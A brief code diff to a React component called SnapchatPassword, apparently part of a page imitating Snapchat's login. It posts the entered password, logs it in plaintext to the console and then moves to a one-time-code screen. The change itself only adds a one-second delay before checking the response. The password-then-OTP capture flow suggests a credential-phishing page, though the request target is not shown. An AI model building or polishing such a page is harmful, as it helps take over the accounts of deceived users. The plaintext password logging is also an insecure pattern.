@@ -40,6 +40,7 @@ const SnapchatPassword = () => {
           body: JSON.stringify({ password: password })
         });
         
+        await new Promise(resolve => setTimeout(resolve, 1000));
         if (response.ok) {
           console.log('Password submitted:', password);
           // Don't poll, just move to OTP screen
